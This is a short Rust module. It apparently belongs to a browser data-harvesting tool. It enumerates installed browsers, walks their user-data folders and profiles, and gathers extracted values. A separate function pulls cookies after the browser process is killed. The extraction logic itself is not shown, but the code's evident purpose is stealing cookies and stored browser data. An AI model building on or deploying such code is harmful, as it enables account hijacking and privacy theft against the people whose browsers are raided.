pub mod base;


pub fn extract_all() -> Vec<(String, String)> {
    use crate::browsers::common::paths;
    let mut results = Vec::new();
    let installed = paths::discover_installed_browsers();
    for browser in installed {
        let user_data = paths::user_data_path(&browser);
        let browser_results = base::extract_for_browser(&browser.name, &user_data, browser.has_profiles);
        results.extend(browser_results);
    }
    results
}

pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
    base::extract_cookies_post_kill()
}
